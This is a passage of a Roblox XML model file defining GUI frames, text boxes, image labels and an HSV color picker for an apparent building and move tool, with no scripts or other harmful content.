													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXF5B74CFA3A6245B4BE93AE32CA7D1D04">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX4EE02E9CF9504F68BFAE7F26979CAD51">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278255360</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX682B9738B03B4321A3E466DAB805A597">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX7662E04ABDBE49309D6EB49D9AB13F22">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">BInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>109</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX3762941E874A4A7B8BB0CB9B97ACA56E">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBX2A625C46147E480C82677A1DEADDCFF2">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX3C74F29B97B645848A8D0102B50841CB">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190335</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX0EE5691E885D47C6BF0325092E8F9DE2">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="ImageButton" referent="RBX65C48F356C234746BE90D5F074A311F2">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">true</bool>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.400000006</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141313631</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<bool name="Modal">false</bool>
												<string name="Name">HSVPicker</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>160</XO>
													<YS>0</YS>
													<YO>-2</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>27</XO>
													<YS>0</YS>
													<YO>27</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
											<Item class="Frame" referent="RBX639E4FAE5F8F47DFB43A2587E7266C79">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278190080</Color3>
													<float name="BackgroundTransparency">0.75</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Shadow</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXFA2EC9015B1C49E9840573849AD538FD">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX2114B768531B40A4824AF7036018B3C7">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>16</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX901A9E1A842D4CCD9A3C7BEDAD2685C5">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4284572001</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">Separator</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>151</XO>
													<YS>0</YS>
													<YO>10</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>4</XO>
													<YS>0</YS>
													<YO>4</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX3F7C45717C564EAAAADB16DC88763551">
							<Properties>
								<bool name="Active">true</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4288914085</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTMoveToolGUI</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>0</XO>
									<YS>0</YS>
									<YO>280</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>245</XO>
									<YS>0</YS>
									<YO>90</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBX955D431D7B05439C91B27B4E43DD12D7">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Changes</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="TextLabel" referent="RBX07D74964CF8B46D2B20BDF4000232ABD">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">3</token>
										<string name="Name">Text</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">moved 0 studs</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">11</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX997F064886CF4E449D34F257B20ACC72">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294945280</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX11A1B2472666481FBD55DC4F6BB1B9D3">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Info</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>5</XO>
										<YS>0</YS>
										<YO>100</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>-5</XO>
										<YS>0</YS>
										<YO>60</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXC0AAA7A505E341C8BA8F9D633D35E3F4">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Center</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>30</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX39940CC3C9F24F0AAFF3E97EB20D34D2">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Z</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>164</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>50</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="ImageLabel" referent="RBX911D25C65BEB4E269FCC9EC87337E337">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<string name="Name">Background</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
